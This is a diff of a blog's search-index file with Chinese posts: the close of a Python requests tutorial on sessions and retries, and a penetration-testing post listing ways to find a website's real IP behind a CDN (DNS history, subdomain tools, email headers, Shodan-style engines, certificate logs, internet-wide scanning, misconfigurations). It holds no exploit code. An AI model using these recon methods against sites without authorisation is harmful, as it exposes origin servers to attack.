+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Session 用于跨请求保留参数。 例如，如果要跨多个请求使用相同的身份验证,当你的应用程序想要再次连接到同一服务器时，它将重用池中的连接而不是建立新连接。</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.Session() <span class="keyword">as</span> session:</span><br><span class="line">    session.auth = (<span class="string">&#x27;username&#x27;</span>, getpass())</span><br><span class="line">    response = session.get(<span class="string">&#x27;https://api.github.com/user&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="最大重试">最大重试</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">通过 Transport Adapters，你可以为每个与之交互的服务定义一组配置。 例如，假设你希望所有对于https://api.github.com的请求在最终抛出 ConnectionError 之前重试三次。 你将构建一个 Transport Adapter，设置其 max_retries 参数，并将其装载到现有的 Session</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.adapters <span class="keyword">import</span> HTTPAdapter</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">github_adapter = HTTPAdapter(max_retries=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use `github_adapter` for all requests to endpoints that start with this URL</span></span><br><span class="line">session.mount(<span class="string">&#x27;https://api.github.com&#x27;</span>, github_adapter)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    session.get(<span class="string">&#x27;https://api.github.com&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> ConnectionError <span class="keyword">as</span> ce:</span><br><span class="line">    print(ce)</span><br></pre></td></tr></table></figure>
+<h2 id="结尾">结尾</h2>
+<blockquote>
+<blockquote>
+<p>re库参考：<a href="https://juejin.im/post/5d8c630e51882511f444f65b">https://juejin.im/post/5d8c630e51882511f444f65b</a></p>
+</blockquote>
+</blockquote>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>python库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>SqlMap代理池</title>
     <url>/2020/06/22/%E4%BB%A3%E7%90%86%E6%B1%A0/</url>
     <content><![CDATA[<h2 id="获取代理池">获取代理池</h2>
@@ -1369,6 +1310,65 @@ SSL证书搜索引擎：</p>
       </categories>
       <tags>
         <tag>Sqlmap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>绕过CDN寻找真实IP</title>
+    <url>/2020/06/23/%E7%BB%95%E8%BF%87CDN/</url>
+    <content><![CDATA[<blockquote>
+<p>目前很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
+</blockquote>
+<h2 id="一、DNS历史解析记录">一、DNS历史解析记录</h2>
+<p>查询域名的历史解析记录，找网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>
+<h2 id="二、子域名">二、子域名</h2>
+<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。<br>
+常用的子域名查找方法和工具：</p>
+<ol>
+<li>搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</li>
+<li>在线查询网站：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;tool.chinaz.com&#x2F;subdomain&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;i.links.cn&#x2F;subdomain&#x2F;    </span><br><span class="line">http:&#x2F;&#x2F;subdomain.chaxun.la&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;searchdns.netcraft.com&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;www.virustotal.com&#x2F;</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li>子域名爆破工具</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute:https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">Sublist3r:https:&#x2F;&#x2F;github.com&#x2F;aboul3la&#x2F;Sublist3r</span><br></pre></td></tr></table></figure>
+<h2 id="三、网站邮件头信息">三、网站邮件头信息</h2>
+<p>比如：邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
+<p><img src="https://raw.githubusercontent.com/Dsysf/images/master/img/20200623112316.png" alt=""></p>
+<h2 id="四、网络空间安全引擎搜索">四、网络空间安全引擎搜索</h2>
+<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https:&#x2F;&#x2F;www.zoomeye.org</span><br><span class="line">Shodan：https:&#x2F;&#x2F;www.shodan.io</span><br><span class="line">Fofa：https:&#x2F;&#x2F;fofa.so</span><br></pre></td></tr></table></figure>
+<h2 id="五、利用SSL证书">五、利用SSL证书</h2>
+<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。<br>
+SSL证书搜索引擎：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;censys.io&#x2F;ipv4?q&#x3D;github.com</span><br></pre></td></tr></table></figure>
+<h2 id="六、国外主机解析域名">六、国外主机解析域名</h2>
+<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。<br>
+国外多PING测试工具：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;zh_cn&#x2F;ping.php</span><br><span class="line">http:&#x2F;&#x2F;host-tracker.com&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.webpagetest.org&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;dnscheck.pingdom.com&#x2F;</span><br></pre></td></tr></table></figure>
+<h2 id="七、全网扫描">七、全网扫描</h2>
+<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
+<ol>
+<li>ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zmap&#x2F;zmap</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;robertdavidgraham&#x2F;masscan</span><br></pre></td></tr></table></figure>
+<h2 id="八、配置不当导致绕过">八、配置不当导致绕过</h2>
+<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
+<ul>
+<li>案例1：为了方便用户访问，<a href="http://xn--www-ot9d021dl8ca199e.test.com">我们常常将www.test.com</a> 和 <a href="http://test.com">test.com</a> 解析到同一个站点，<a href="http://xn--CDNwww-5e8i318auw2h9jblx9h.test.com">而CDN只配置了www.test.com</a>，<a href="http://xn--test-pr9lp7quqa868a.com">通过访问test.com</a>，就可以绕过 CDN 了。</li>
+<li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>技巧</tag>
       </tags>
   </entry>
   <entry>
